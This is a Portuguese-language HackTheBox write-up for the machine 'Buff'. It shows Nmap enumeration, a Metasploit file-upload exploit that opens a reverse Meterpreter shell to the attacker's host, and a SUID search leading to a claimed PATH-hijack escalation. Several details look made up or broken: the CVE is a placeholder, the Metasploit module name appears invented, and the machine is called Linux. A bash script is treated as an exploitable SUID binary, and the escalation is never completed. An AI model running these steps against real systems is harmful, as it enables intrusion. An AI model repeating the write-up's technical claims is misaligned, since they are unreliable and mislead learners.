Writeup: Máquina "Buff" - HackTheBox

Exploração detalhada da máquina Buff do HackTheBox, demonstrando técnicas de enumeração, exploração de vulnerabilidades e escalonamento de privilégios.

Dificuldade: Média
Pontuação: 30 pontos
Data: 15/03/2024

Sumário Executivo

Esta máquina Linux apresenta uma aplicação web vulnerável que permite a exploração inicial. O escalonamento de privilégios é alcançado através de um binário SUID mal configurado.

Principais Técnicas Utilizadas
  • Enumeração de serviços com Nmap
  • Identificação de versão vulnerável de aplicação web
  • Exploração de vulnerabilidade conhecida (CVE)
  • Escalonamento de privilégios através de binário SUID

1. Enumeração

1.1 Scan de Portas com Nmap

Iniciamos com um scan básico para identificar os serviços em execução:

terminal@kali:~$
$ nmap -sC -sV 10.10.10.198

1.2 Enumeração Web

Acessando a porta 80, encontramos uma página web com informações sobre um software de fitness chamado "Gym Management System".

2. Exploração

2.1 Identificação da Vulnerabilidade

Analisando o código fonte da página, encontramos uma referência ao software "Gym Management System 1.0". Uma busca rápida no Google revela uma vulnerabilidade conhecida (CVE-2020-XXXX).

Vulnerabilidade Crítica Identificada

Crítico

CVE-2020-XXXX: Upload de arquivo arbitrária no Gym Management System permite execução remota de código.

Impacto: Permite ao atacante fazer upload de arquivos PHP maliciosos e obter acesso remoto ao servidor.

2.2 Exploração com Metasploit

Utilizamos o Metasploit para explorar a vulnerabilidade:

terminal@kali:~$
$ msfconsole
msf6 > use exploit/multi/http/gym_management_upload
msf6 exploit(gym_management_upload) > set RHOSTS 10.10.10.198
RHOSTS => 10.10.10.198
msf6 exploit(gym_management_upload) > set LHOST 10.10.14.15
LHOST => 10.10.14.15
msf6 exploit(gym_management_upload) > exploit

[*] Started reverse TCP handler on 10.10.14.15:4444
[*] Sending stage (39282 bytes) to 10.10.10.198
[*] Meterpreter session 1 opened (10.10.14.15:4444 -> 10.10.10.198:49728)

3. Escalonamento de Privilégios

3.1 Enumeração Local

Após obter acesso inicial, realizamos enumeração local para identificar vetores de escalonamento:

www-data@buff:~$
$ find / -perm -4000 2>/dev/null
/bin/mount
/bin/ping
/bin/su
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/chsh
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/local/bin/backup

3.2 Exploração do Binário SUID

O binário /usr/local/bin/backup chama atenção por não ser um binário padrão do sistema. Analisando seu conteúdo:

# strings /usr/local/bin/backup
#!/bin/bash
cd /var/www/html
tar cf /opt/backups/backup.tar *

Este script utiliza o comando tar sem o caminho absoluto, o que permite um ataque de PATH hijacking.

Conclusão

Esta máquina demonstrou a importância de manter softwares atualizados e a necessidade de revisar binários SUID em sistemas Linux. A combinação de uma vulnerabilidade web conhecida com uma configuração inadequada de permissões permitiu acesso completo ao sistema.
